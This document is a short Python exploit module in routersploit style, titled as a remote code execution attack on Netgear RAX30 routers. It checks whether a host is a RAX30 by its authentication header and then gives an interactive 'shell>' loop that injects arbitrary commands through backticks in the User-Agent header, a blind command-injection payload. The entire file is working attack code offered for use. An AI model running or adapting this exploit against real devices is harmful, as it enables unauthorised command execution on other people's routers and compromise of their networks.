# rsf exploit module
# title: Netgear RAX30 RCE
# description: Exploits RCE in Netgear RAX30 devices.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command loop...")
            print("[*] It is blind command injection")
            self.shell()
        else:
            print("[-] Target is not vulnerable")

    def execute(self, cmd):
        headers = {"User-Agent": f"`{cmd}`"}
        try:
            self.session.get(
                f"http://{self.target}:{self.port}/",
                headers=headers,
                timeout=5
            )
        except:
            pass
        return ""

    def check(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/", timeout=5)
            if response:
                auth_header = response.headers.get('WWW-Authenticate', '')
                return 'Basic realm="RAX30"' in auth_header
        except:
            pass
        return False

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                self.execute(cmd)
            except KeyboardInterrupt:
                break
